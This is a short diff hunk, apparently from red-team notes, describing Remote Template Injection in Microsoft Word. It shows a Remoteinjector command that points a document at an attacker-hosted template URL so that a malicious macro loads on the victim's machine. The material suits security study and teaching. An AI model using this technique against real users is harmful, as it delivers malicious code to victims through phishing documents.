@@ -310,6 +310,7 @@ Go to `Site Management` > `Host File` you will see your powershell payload hoste
 Microsoft Word has the option of creating new documents from a template.  Office has some templates pre-installed, you can make custom templates, and even download new ones.  Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.
 
 - Automation
+
 [Remoteinjector](https://github.com/JohnWoodman/remoteinjector) is a python tool that can automate this process so that you don't have to modify the XML manually.
 ```
 ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
